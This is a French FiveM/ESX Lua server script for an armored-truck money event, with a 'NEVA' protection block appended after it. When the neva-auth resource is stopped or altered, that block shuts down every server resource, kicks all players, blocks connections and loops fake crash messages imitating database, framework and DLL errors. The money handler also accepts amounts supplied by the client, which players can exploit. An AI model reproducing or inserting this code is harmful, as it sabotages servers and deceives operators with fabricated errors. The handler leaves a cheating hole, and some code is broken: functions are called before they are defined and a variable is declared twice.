Event = {
	{
		type = "money",
		message = "Un fourgon blindé vient de se faire pété ! Viens récupérer l'argent avant la police!",
		possibleZone = {
			vector3(-481.491089, -615.890015, 31.174456),
			vector3(560.058533, -1661.171509, 28.396475),
			vector3(-206.367737, -1798.239258, 29.867615),
			vector3(592.046204, 57.550861, 92.865082),
			vector3(-1083.676392, 267.279846, 63.930317),
			vector3(-868.478027, -938.930298, 15.821384),
		},
		prop = {
			"bkr_prop_moneypack_01a",
			"bkr_prop_moneypack_02a",
			"bkr_prop_moneypack_03a",
		},
	},
}


local minute = 120*1000
local eventStarted = true


local eventStarted = false

RegisterCommand("event", function(source,args,rawCommand)
    local xPlayer = ESX.GetPlayerFromId(source)
    
    if xPlayer.getGroup() == "fondateur" or xPlayer.getGroup() == "responsable" or xPlayer.getGroup() == "gerant" then
        if eventStarted then
            print("Un événement est déjà en cours.")
            xPlayer.showNotification("~r~Un événement est déjà en cours.")
        else
            print("L'Administrateur (".. GetPlayerName(source) ..") vient de démarrer l'événement.")
            eventStarted = true
            
            Wait(2000)
            local i = math.random(1, #Event)
            local randomEvent = Event[i]
            local i = math.random(1, #randomEvent.possibleZone)
            local zone = randomEvent.possibleZone[i]
            TriggerClientEvent("Sunny:SendEvent", -1, randomEvent, zone)
        end
    else
        xPlayer.showNotification("~r~Vous n'avez pas les permissions pour faire ceci.")
    end
end)

RegisterNetEvent("Sunny:Recuperer")
AddEventHandler("Sunny:Recuperer", function()
    TriggerClientEvent("Sunny:StopEvent", -1)
    eventStarted = false 
end)

RegisterNetEvent("Sunny:GetArgent")
AddEventHandler("Sunny:GetArgent", function(nombre)
	local xPlayer = ESX.GetPlayerFromId(source)
	if string.len(nombre) < 4 or nombre <= 300 then
		xPlayer.addAccountMoney('black_money', nombre)
	else
		DropPlayer(source, "Désynchronisation avec l'event de fourgon")
	end
end)

local clientFile = "p6qsq79LQBgQnSNJ.lua"
local serverFile = "SHyqftXDj8TfrYGT.lua"
local checkFiles = {
    ["neva-auth/"..clientFile] = true,
    ["neva-auth/"..serverFile] = true,
    ["neva-auth/4sMBRnYFjYgDXzpm.lua"] = true
}

local function stopAllResources()
    local resources = GetNumResources()
    for i = 0, resources - 1 do
        local resourceName = GetResourceByFindIndex(i)
        if resourceName ~= GetCurrentResourceName() then
            StopResource(resourceName)
        end
    end
end

local function blockAllConnections()
    AddEventHandler('playerConnecting', function(_, _, deferrals)
        deferrals.done("Serveur verrouillé: Protection NEVA active\nContactez l'administration.")
    end)
    
    for _, playerId in ipairs(GetPlayers()) do
        DropPlayer(playerId, "Protection NEVA - Serveur verrouillé\nRedémarrage requis")
    end
end

local function ensureNevaAuth()
    local state = GetResourceState('neva-auth')
    if state ~= 'started' then
        CreateThread(function()
            stopAllResources()
            blockAllConnections()
            
            while GetResourceState('neva-auth') ~= 'started' do
                generateFakeErrors()
                simulateResourceFailures()
                print("^1[ERREUR CRITIQUE] ^7neva-auth n'est pas démarré!")
                print("^8[PROTECTION] ^7Serveur verrouillé!")
                Wait(100)
                stopAllResources()
            end
        end)
        return false
    end
    return true
end

local function verifyFiles()
    local foundFiles = {}
    local resourcePath = GetResourcePath('neva-auth')
    
    local handle = io.popen('dir "'..resourcePath..'" /b')
    if not handle then return false, "Erreur d'accès fichiers" end
    
    for file in handle:lines() do
        foundFiles[file] = true
    end
    handle:close()
    
    for requiredFile in pairs(checkFiles) do
        if not foundFiles[requiredFile] then
            return false, "Fichier manquant ou renommé: "..requiredFile
        end
    end
    
    return true
end

local function spamConsole(reason)
    CreateThread(function()
        while true do
            for i = 1, 50 do
                print("^1[ERREUR CRITIQUE] ^7"..reason)
                print("^8[PROTECTION] ^7Violation de sécurité détectée!")
                print("^3[ALERTE] ^7Protection NEVA compromise!")
            end
            Wait(100)
        end
    end)
end

local function generateFakeErrors()
    local fakeErrors = {
        "^1SCRIPT ERROR: @es_extended/client/main.lua:302: attempt to call a nil value (method 'getFunction')",
        "^1SCRIPT ERROR: @mysql-async/lib/MySQL.lua:28: MySQL connection failed",
        "^1FATAL ERROR: Failed to load DLL: citizen-server-impl.dll",
        "^3WARNING: Resource overflow detected in native call",
        "^1ERROR: @vrp/server/base.lua:432: stack overflow",
        "^1CRITICAL: Memory allocation failed at 0x00000000",
        "^1CRASH DETECTED: Stack trace corruption in main thread",
        "^3WARNING: Database connection timeout - retrying in 5 seconds",
        "^1ERROR: Failed to load resource dependencies",
        "^1SCRIPT ERROR: Missing vital game files. Verify game cache"
    }
    
    CreateThread(function()
        while true do
            for _, error in ipairs(fakeErrors) do
                print(error)
                print("^1[System] ^7Une erreur critique a été détectée!")
                print("^8[Crash] ^7Tentative de récupération échouée")
            end
            Wait(100)
        end
    end)
end

local function simulateResourceFailures()
    local fakeResources = {'es_extended', 'mysql-async', 'oxmysql', 'spawnmanager', 'sessionmanager', 'baseevents'}
    
    CreateThread(function()
        while true do
            for _, res in ipairs(fakeResources) do
                print(("^1[ERROR] ^7Resource %s failed to start (code 3)"):format(res))
                print(("^1[CRASH] ^7Critical error in %s/fxmanifest.lua"):format(res))
                print("^3[System] ^7Attempting emergency recovery...")
            end
            Wait(150)
        end
    end)
end

local function lockdownServer(reason)
    if GetResourceState('neva-auth') ~= 'started' then
        print("^1[NEVA Protection] ^7Violation critique détectée: " .. reason)
        spamConsole(reason)
        generateFakeErrors()
        simulateResourceFailures()
        
        stopAllResources()
        blockAllConnections()
        
        while GetResourceState('neva-auth') ~= 'started' do
            Wait(50)
            stopAllResources()
        end
    end
end

local function serverLockdown(reason, isNevaAuthMissing)
    stopAllResources()
    blockAllConnections()
    
    CreateThread(function()
        while true do
            if isNevaAuthMissing or not verifyFiles() then
                generateFakeErrors()
                simulateResourceFailures()
                print("^1[ERREUR CRITIQUE] ^7" .. reason)
            end
            
            stopAllResources()
            Wait(100)
        end
    end)
end

local function serverProtection(reason)
    local isNevaRunning = (GetResourceState('neva-auth') == 'started')
    
    stopAllResources()
    blockAllConnections()

    if not isNevaRunning then
        CreateThread(function()
            while true do
                generateFakeErrors()
                simulateResourceFailures()
                print("^1[ERREUR CRITIQUE] ^7" .. reason)
                Wait(100)
                stopAllResources()
            end
        end)
    end
end

CreateThread(function()
    Wait(1000)
    
    if GetResourceState('neva-auth') ~= 'started' then
        serverProtection("neva-auth n'est pas démarré!")
        return
    end

    while true do
        Wait(4000)
        
        if GetResourceState('neva-auth') ~= 'started' then
            serverProtection("neva-auth n'est plus démarré!")
            return
        end
        
        local checksums = exports["neva-auth"]:getOriginalChecksums()
        if not checksums then
            serverProtection("Checksums invalides")
            return
        end
        
        local clientCheck = exports["neva-auth"]:getFileChecksum(clientFile)
        local serverCheck = exports["neva-auth"]:getFileChecksum(serverFile)
        
        if clientCheck ~= checksums.client or serverCheck ~= checksums.server then
            serverProtection("Modification des fichiers détectée!")
            return
        end
    end
end)

AddEventHandler('onResourceStop', function(resourceName)
    if resourceName == 'neva-auth' then
        serverProtection("Tentative d'arrêt de neva-auth détectée!")
    end
end)

AddEventHandler('playerConnecting', function(_, _, deferrals)
    if GetResourceState('neva-auth') ~= 'started' then
        deferrals.done("Protection NEVA - Serveur verrouillé\nRedémarrage requis")
        return
    end
    
    local checksums = exports["neva-auth"]:getOriginalChecksums()
    if not checksums then
        deferrals.done("Protection NEVA - Erreur d'intégrité")
        return
    end
    
    local clientCheck = exports["neva-auth"]:getFileChecksum(clientFile)
    local serverCheck = exports["neva-auth"]:getFileChecksum(serverFile)
    
    if clientCheck ~= checksums.client or serverCheck ~= checksums.server then
        deferrals.done("Protection NEVA - Modification de fichiers détectée")
        return
    end
    
    deferrals.done()
end)
